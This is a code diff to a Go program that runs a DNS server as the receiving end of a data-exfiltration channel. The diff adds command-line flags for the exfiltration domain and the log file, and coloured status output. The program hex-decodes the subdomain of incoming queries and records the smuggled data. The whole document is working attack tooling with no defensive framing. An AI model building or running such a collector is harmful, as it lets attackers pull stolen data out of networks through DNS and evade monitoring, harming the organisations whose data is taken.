@@ -2,7 +2,9 @@ package main
 
 import (
 	"encoding/hex"
+	"flag"
 	"fmt"
+	"log"
 	"os"
 	"strings"
 
@@ -11,10 +13,27 @@ import (
 
 type dnsHandler struct{}
 
-const (
-	malDomain   string = "example.com"
-	logFileName string = "dns_exfiltrate.log"
+var (
+	domain      string
+	logFileName string
 )
+
+// CLI colors
+const (
+	Reset = "\033[0m"
+	Green = "\033[32m"
+	Blue  = "\033[34m"
+)
+
+// parse CLI flags
+func init() {
+	flag.StringVar(&domain, "d", "example.com", "domain used to exfiltrate data")
+	flag.StringVar(&logFileName, "f", "", "file used to store incomming data")
+	flag.Parse()
+	if logFileName != "" {
+		fmt.Println(Blue+"[*] Log file:", logFileName, Reset)
+	}
+}
 
 func resolve(domain string, qtype uint16) *dns.Msg {
 	msg := new(dns.Msg)
@@ -36,12 +55,16 @@ func hexDecode(subdomain string) {
 	if err != nil {
 		return
 	} else {
-		fmt.Println("data:", string(data))
-		writeToFile(data)
+		if logFileName == "" {
+			fmt.Printf("%s", string(data))
+		} else {
+			writeToFile(data)
+		}
 	}
 
 }
 
+// write decoded data to a file
 func writeToFile(data []byte) {
 	f, err := os.OpenFile(logFileName, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
 	if err != nil {
@@ -60,11 +83,9 @@ func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 	msg.Authoritative = true
 
 	for _, question := range r.Question {
-		fmt.Printf("Received query: %s\n", question.Name)
 		// get subdomain to exfiltrate data
 		d := strings.Split(question.Name, ".")
-		domain := d[len(d)-3] + "." + d[len(d)-2]
-		if domain == malDomain {
+		if d[len(d)-3]+"."+d[len(d)-2] == domain {
 			hexDecode(d[0])
 		}
 		id := msg.Id // set original ID
@@ -87,9 +108,9 @@ func main() {
 		ReusePort: true,
 	}
 
-	fmt.Println("Starting DNS server on port 53")
+	fmt.Println(Blue + "[*] Starting DNS server on port 53" + Reset)
 	err := server.ListenAndServe()
 	if err != nil {
-		fmt.Printf("Failed to start server: %s\n", err.Error())
+		log.Fatalf("Failed to start server: %s\n", err.Error())
 	}
 }
